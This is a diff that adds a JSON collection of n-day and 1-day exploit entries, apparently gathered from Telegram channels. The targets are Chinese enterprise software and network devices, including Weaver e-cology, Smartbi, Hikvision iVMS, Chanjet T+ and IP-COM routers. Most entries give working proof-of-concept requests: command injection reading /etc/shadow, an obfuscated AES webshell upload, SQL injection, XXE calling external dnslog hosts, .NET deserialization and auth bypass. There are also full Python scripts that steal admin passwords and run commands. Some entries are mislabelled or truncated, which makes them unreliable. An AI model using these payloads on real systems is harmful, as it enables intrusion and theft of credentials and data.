@@ -1,0 +1,3252 @@
+[
+ {
+  "vendor": "Array",
+  "name": "Arris VAP2500 list_mac_address 未授权远程代码执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "Hytec",
+  "name": "Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "title=\"index\" && header=\"lighttpd/1.4.30\"",
+  "date": "08.15",
+  "poc": "/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137921",
+  "label": "nday"
+ },
+ {
+  "vendor": "IP-COM",
+  "name": "IP-COM M50-1",
+  "type": "RCE",
+  "source": "TG",
+  "info": "#!/usr/bin/env python #-*- coding:utf-8 -*- import requests import sys import base64 IP = sys.argv[1] #IP ='ip:port' command= sys.argv[2] #command = \"ping -c 2 ws02.l.dnslog.io\" headers = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'DNT': '1', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' } # get password password = '' password_encode= '' r = requests.get('http://'+IP+'/cgi-bin/DownloadCfg/RouterCfm.cfg', headers=headers) if r.status_code == 200 and 'sys.userpass=' in r.text : password_index = r.text.find('sys.userpass=') i=1 while True: if r.text[password_index+i]!='\\n' : i+=1 else : break pass password_encode = r.text[password_index+13:password_index+i] password = base64.b64decode(password_encode.encode(\"utf-8\")).decode('utf-8') print('[+] GET Password_encode->'+password_encode) print('[+] And Password->'+password) else: print('[-] No Bug') exit(0) # admin login logindata = 'username=admin&password='+password_encode cookie_value='' headers1 = { 'Host': IP, 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(logindata)), 'DNT': '1', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/login/Auth', headers=headers1, data=logindata, allow_redirects=False) for key,value in r.cookies.items(): cookie_value += key + '=' + value if r.status_code == 302 and 'index.asp' in r.text: print('[+] Success Login!') print('[+] get cookie->'+cookie_value) else : print('[+] Login False!') exit(0) #send cmd payload cmddata='networkTool=1&hostName=-c%201%20www.baidu.com;'+command+';&packageNum=1&packageSize=32' headers2 = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Content-Length': str(len(cmddata)), 'DNT': '1', 'Connection': 'close', 'Referer': 'http://'+IP+'/sysManage/sysTool.html', 'Cookie': cookie_value, 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/goform/setFixTools', headers=headers2, data=cmddata) if r.status_code == 200 : print('[+] Success Attack!') print(r.text) headers3 = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'DNT': '1', 'Connection': 'close', 'Cookie': cookie_value, 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/goform/logout', headers=headers3, allow_redirects=False) if r.status_code == 302 and 'login.asp' in r.text: print('[+] Success Logout!')",
+  "date": "08.15",
+  "poc": "GET /action/setFixTools?networkTools=2&hostname=-h%0aping%20x.x.x.x%20-w%2-5%0a",
+  "label": "nday"
+ },
+ {
+  "vendor": "IP-COM",
+  "name": "IP-COM M50-2",
+  "type": "RCE",
+  "source": "TG",
+  "info": "#!/usr/bin/env python #-*- coding:utf-8 -*- import requests import sys import base64 import random IP = sys.argv[1] command= sys.argv[2] #command = \"chmod 777 /tmp/index.htm;/tmp/index.htm&\" command = command.replace(\" \",\"%20\") print(command) headers = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'DNT': '1', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' } # get password password = '' password_encode= '' r = requests.get('http://'+IP+'/cgi-bin/DownloadCfg/RouterCfm.cfg', headers=headers) if r.status_code == 200 and 'sys.userpass=' in r.text : password_index = r.text.find('sys.userpass=') i=1 while True: if r.text[password_index+i]!='\\n' : i+=1 else : break pass password_encode = r.text[password_index+13:password_index+i] password = base64.b64decode(password_encode.encode(\"utf-8\")).decode('utf-8') print('[+] GET Password_encode->'+password_encode) print('[+] And Password->'+password) else: print('[-] No Bug') exit(0) # admin login logindata = 'username=admin&password='+password_encode cookie_value='' headers1 = { 'Host': IP, 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': str(len(logindata)), 'DNT': '1', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/login/Auth', headers=headers1, data=logindata, allow_redirects=False) for key, value in r.cookies.items(): cookie_value += key + '=' + value if r.status_code == 302 and 'index.asp' in r.text: print('[+] Success Login!') print('[+] get cookie->'+cookie_value) else : print('[+] Login False!') exit(0) #send cmd payload cmddata='networkTool=1&enable=2&level=2&module=httpd;'+command headers2 = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'Content-Length': str(len(cmddata)), 'DNT': '1', 'Connection': 'close', 'Referer': 'http://'+IP+'/sysManage/sysTool.html', 'Cookie': cookie_value, 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/goform/setDebugCfg', headers=headers2, data=cmddata) if r.status_code == 200 : print('[+] Success Attack!') # print(r.text) else: print('[+] Attack False!') headers3 = { 'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5', 'Accept-Encoding':'gzip, deflate', 'DNT': '1', 'Connection': 'close', 'Cookie': cookie_value, 'Upgrade-Insecure-Requests': '1' } r = requests.post('http://'+IP+'/goform/logout', headers=headers3, allow_redirects=False) if r.status_code == 302 and 'login.asp' in r.text: print('[+] Success Logout!')",
+  "date": "08.15",
+  "poc": "POST /action/umountUSBPartition?usbPartitionName=-h%0aping%20x.x.x.x%20-w%2-5%0a",
+  "label": "nday"
+ },
+ {
+  "vendor": "Microsoft",
+  "name": "OfficeWeb365 远程代码执行漏洞",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /PW/SaveDraw?path=../../Content/img&idx=1.aspx HTTP/1.1 Host:xxx User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36 Content-Length: 2265 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ Page Language=\"C#\" %> <%@Import Namespace=\"System.Reflection\" %> <script runat=\"server\"> private byte[] Decrypt(byte[] data) { string key=\"e45e329feb5d925b\"; data = Convert.FromBase64String(System.Text.Encoding.UTF8.GetString(data)); System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged(); aes.Mode = System.Security.Cryptography.CipherMode.ECB; aes.Key = Encoding.UTF8.GetBytes(key); aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7; return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length); } private byte[] Encrypt(byte[] data) { string key = \"e45e329feb5d925b\"; System.Security.Cryptography.RijndaelManaged aes = new System.Security.Cryptography.RijndaelManaged(); aes.Mode = System.Security.Cryptography.CipherMode.ECB; aes.Key = Encoding.UTF8.GetBytes(key); aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7; return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(aes.CreateEncryptor().TransformFinalBlock(data, 0, data.Length))); } </script> <% //byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(Decrypt(c)).CreateInstance(\"U\").Equals(this); byte[] c=Request.BinaryRead(Request.ContentLength); string asname=System.Text.Encoding.ASCII.GetString(new byte[] {0x53,0x79,0x73,0x74,0x65,0x6d,0x2e,0x52,0x65,0x66,0x6c,0x65,0x63,0x74,0x69,0x6f,0x6e,0x2e,0x41,0x73,0x73,0x65,0x6d,0x62,0x6c,0x79}); Type assembly=Type.GetType(asname); MethodInfo load = assembly.GetMethod(\"Load\",new Type[] {new byte[0].GetType()}); object obj=load.Invoke(null, new object[]{Decrypt(c)}); MethodInfo create = assembly.GetMethod(\"CreateInstance\",new Type[] { \"\".GetType()}); string name = System.Text.Encoding.ASCII.GetString(new byte[] { 0x55 }); object pay=create.Invoke(obj,new object[] { name }); pay.Equals(this);%>>--- 纯文本 shell：https://xxx/Content/img/UserDraw/drawPW1.aspx 冰蝎4，deafult_aes",
+  "label": "1day"
+ },
+ {
+  "vendor": "万户",
+  "name": "万户Ezoffice 协同管理平台rce",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "--189d9163681--",
+  "label": "nday"
+ },
+ {
+  "vendor": "万户",
+  "name": "万户任意文件上传",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /defaultroot/wpsservlet?fileType=.jsp%00&option=SaveNewFile&unewdacid=..%2F..%2Fpublic%2Fedit%2Fxman3",
+  "label": "nday"
+ },
+ {
+  "vendor": "亿赛通",
+  "name": "亿赛通文件下载",
+  "type": "任意文件下载",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "https://xxx/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql /CDGServer3/SQL/MSSQL/ CreateCDGProcedure.sql CreateCDGProcedure1.sql create_SmartSec_mssql.sql create_SmartSec_mssql.txt /CDGServer3/SQL/ORACLE/ create_index_SmartSec_oracle.sql create_SmartSec_oracle.sql create_table_SmartSec_oracle.sql drop_table_SmartSec_oracle.sql initOracleDB.sql /CDGServer3/SQL/ORACLE/updateSQL/ CDG800_update_oracle.sql renminyinhang_oracle.sql",
+  "label": "1day"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信网神行为感知分析系统v3.0rce",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "/json/Util/download path=../../../sysbackup/自动备份 3.2.1 2021-12-01_03-00-02.backup3schema=http&type-email",
+  "label": "nday"
+ },
+ {
+  "vendor": "宏景",
+  "name": "宏景HCM命令执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "第一个包 POST /services/HrSoapService HTTP/2 Host: rlzy.scun.edu.cn Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 Soapaction: \"\" Content-Length: 1225 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY a SYSTEM \"http://127.0.0.1:80/w_selfservice/oauthservlet/%2e%2e/%2e%2e/axisservices/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22randomService%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22..%2Fwebapps%2FROOT%2Fcnvdtest.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment\">]> <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:hrs=\"http://www.hjsoft.com.cn/HrSoapService\"> <soapenv:Header/> <soapenv:Body> <hrs:syncProcess> <hrs:in0>aaa &a;</hrs:in0> <hrs:in1>aaa</hrs:in1> <hrs:in2>aaa</hrs:in2> </hrs:syncProcess> </soapenv:Body> </soapenv:Envelope> 第二个包 POST /axisservices/randomService HTTP/2 Host: rlzy.scun.edu.cn Accept-Encoding: gzip,deflate Content-Type: text/xml;charset=UTF-8 Soapaction: \"\" Content-Length: 721 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:util=\"http://util.java\"> <soapenv:Header/> <soapenv:Body> <util:ints soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <in0 xsi:type=\"xsd:int\" xs:type=\"type:int\" xmlns:xs=\"http://www.w3.org/2000/XMLSchema-instance\"><![CDATA[<html> <head> <title>CNVD1</title> </head> <body> Hello Administrator! <% out.println(\"CNVD TEST!\"); %> </body> </html>]]></in0> <in1 xsi:type=\"xsd:int\" xs:type=\"type:int\" xmlns:xs=\"http://www.w3.org/2000/XMLSchema-instance\">?</in1> </util:ints> </soapenv:Body> </soapenv:Envelope>",
+  "label": "nday"
+ },
+ {
+  "vendor": "思迈特",
+  "name": "Smartbi 权限绕过",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1 Host: xx.xx.xx.xx:8080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Length: 0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 http://xxx.xxx.xxx.xxx:xxx 设置成功后，可通过访问/smartbi/smartbix/api/monitor/engineInfo查看是否成功 然后配置远程服务器 from flask import Flask, jsonify, request app = Flask(__name__) @app.route(\"/\", defaults={\"path\": \"\"}, methods=[\"GET\", \"POST\"]) @app.route(\"/<path:path>\", methods=[\"GET\", \"POST\"]) def catch_all(path): if request.method == \"POST\": print(\"Received POST request:\") print(\"Method:\", request.method) print(\"URL:\", request.url) print(\"Headers:\", request.headers) print(\"Data:\", request.data) # 在这里处理 POST 请求的逻辑 response = {\"result\": \"POST request received\"} return jsonify(response), 200 else: # 处理 GET 请求 print(\"Received GET request:\") print(\"Method:\", request.method) print(\"URL:\", request.url) print(\"Headers:\", request.headers) response = {\"result\": \"GET request received\"} return jsonify(response), 200 if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=3306) POST /smartbi/smartbix/api/monitor/token HTTP/1.1 Host: xx.xx.xx.xx Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Length: 0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 experiment 启动web服务器后发生上述数据包抓到token 第三步 利用token登陆 POST /smartbi/smartbix/api/monitor/login HTTP/1.1 Host: 10.211.55.14:18080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: text/plain Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 admin_I8a53b78e0189b47bb47befe10189b48165c80015 {}\"result\": true}证明JSESSIONID有效，获取到jession后可以获取密码 获取密码 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: 10.211.55.14:18080 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Cookie: JSESSIONID=8E183CE44032C98EBE1127E83F9EFAEF; CookieLanguageName=ZH-CN Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Length: 0 Content-Type: application/x-www-form-urlencoded Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 className=UserService&methodName=getPassword&params=[\"admin\"]",
+  "label": "nday"
+ },
+ {
+  "vendor": "正方",
+  "name": "正方rce",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /zfca/axis/CreateCaFile HTTP/1.1 Content-Type: text/xml;charset=UTF-8 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7 Accept-Encoding: gzip, deflate SOAPAction: Cache-Control: no-cache Pragma: no-cache Host: XXXX Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Content-Length: 710 <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:pub=\"http://pubService.webServices.zfca.zfsoft.com\"> <soapenv:Header/> <soapenv:Body> <pub:createFile soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"> <filepath xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">iflihdqs.jsp</filepath> <content xsi:type=\"soapenc:string\" xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\"> <![CDATA[ <% out.println(\"jryjfpak\"); %> ]]> </content> </pub:createFile> </soapenv:Body> </soapenv:Envelope>",
+  "label": "1day"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微7月 fileid SQL注入",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST/ weaver/weaver. file.FileDownloadForOutDoc HTTP/1.1 Host: xxxxxxxx Content -Length: 73 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; ×64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Content -Type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* Origin: Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN, zh;q-0.9 Connection: close isFromOutImg=1&fileid=3+AND+(SELECT+6523+FROM+ (SELECT(SLEEP (5900)))ukYE)#",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-cology XXE",
+  "type": "XXE",
+  "source": "微信",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1 Host: xxx Accept-Encoding: gzip Content-Length: 35 Content-Type: application/xml User-Agent: Go-http-client/1.1 <?xml version=\"1.0\"?> <!DOCTYPE ANY [ <!ENTITY % d SYSTEM \"http://wutvavcfzj.dnstunnel.run\"> %d; ]> <a>&xxe;</a >",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微Ecology OA 前台任意SQL语句执行",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "Name: 泛微OA 前台任意SQL语句执行 Description: 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。 Identifier: DVB: DVB-2023-4662 VulnClass: - SQL注入 Category: - 应用服务 Manufacturer: 泛微网络 Product: 泛微e-cology8.0 Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: '2023-06-12' Is0day: false IncludeExp: false Weakable: false IsXc: true IsCommon: false IsCallBack: false Condition: body=\"/js/ecology8\" || body=\"wui/common/css/w7OVFont_wev8.css\" || (body=\"weaver\" && body=\"ecology\") || (header=\"ecology_JSessionId\" && body=\"login/Login.jsp\") || body=\"/wui/index.html\" || body=\"jquery_wev8\" Solutions: - 请关注厂商的修复版本，并及时更新到最新版本. poc: relative: req0 session: false requests: - method: GET timeout: 10 path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2426.8 Safari/537.36 follow_redirects: true matches: (code.eq(\"200\") && body.regex(\"[0-9A-F]{32}\"))",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微Ecology未授权",
+  "type": "任意文件上传",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /OfficeServer HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK Content-Length: 204 ------WebKitFormBoundarymVk33liI64J7GQaK Content-Disposition: form-data; name=\"aaa\" {'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'100'} ------WebKitFormBoundarymVk33liI64J7GQaK—",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微OA E-Office 10 leave_record.php任意文件上传",
+  "type": "SQL注入",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST/ weaver/weaver. file.FileDownloadForOutDoc HTTP/1.1 Host: xxxxxxxx Content -Length: 73 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; ×64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 X-Requested-With: XMLHttpRequest Content -Type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* Origin: Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN, zh;q-0.9 Connection: close isFromOutImg=1&fileid=3+AND+(SELECT+6523+FROM+ (SELECT(SLEEP (5900)))ukYE)#",
+  "label": "1day"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS-8700综合安防系统XXE",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /acs/api/serviceApi/blackDownload/downloadBlackCallBack?token=xxx HTTP/1.1 Host: x.x.x.x Content-Type: application/x-www-form-urlencoded Content-Length: 471 deviceIndexCode=1&xml=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%20%3F%3E%0A%20%20%20%20%20%20%20%20%3C%21DOCTYPE%20example%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ELEMENT%20example%20ANY%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ENTITY%20file%20SYSTEM%20%22http%3A%2F%2F12345.33548593.ipv6.1433.eu.org%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%3E%0A%3Cexample%3E%26file%3B%3C%2Fexample%3E token生成方式 此网站 https://www.sojson.com/md5/ 例如 http://XXXXXXX/eps/api/triggerSnapshot/download token就等于 http://XXXXXX/eps/api/triggerSnapshot/download+secretKeyIbuilding",
+  "label": "nday"
+ },
+ {
+  "vendor": "海康威视",
+  "name": "海康威视IVMS-8700综合安防系统鸡肋目录泄露",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "GET //eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1 HTTP/1.1 Host: x.x.x.x Content-Type: application/x-www-form-urlencoded Content-Length: 456 deviceIndexCode=1&xml=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%20%3F%3E%0A%20%20%20%20%20%20%20%20%3C%21DOCTYPE%20example%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ELEMENT%20example%20ANY%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%21ENTITY%20file%20SYSTEM%20%22http%3A%2F%2F2nlid7.dnslog.cn%22%20%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%5D%3E%0A%3Cexample%3E%26file%3B%3C%2Fexample%3E",
+  "label": "nday"
+ },
+ {
+  "vendor": "深信服",
+  "name": "sxf-edr0day只影响 2016-2019 这个版本 任意用户登录",
+  "type": "认证绕过",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "任意用户登录 {url}/ui/login.php?user=admin https://118.213.240.190:20443/ui/login.php?user=admin",
+  "label": "nday"
+ },
+ {
+  "vendor": "畅捷通",
+  "name": "畅捷通TPlus 命令执行",
+  "type": "RCE",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
+  "poc": "POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Content-Type: text/plain Accept-Encoding: gzip, deflate X-Ajaxpro-Method: GetStoreWarehouseByStore Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 540 { \"storeID\":{ \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\", \"MethodName\":\"Start\", \"ObjectInstance\":{ \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"StartInfo\":{ \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\", \"FileName\":\"cmd\", \"Arguments\":\"/c ping -n 3 %COMPUTERNAME%.shenglang.eyes.sh\" } } } }",
+  "label": "nday"
+ },
+ {
+  "vendor": "百卓",
+  "name": "Smart S85F 任意文件读取",
+  "type": "任意文件读取",
+  "source": "TG",
+  "info": "",
+  "date": "08.15",
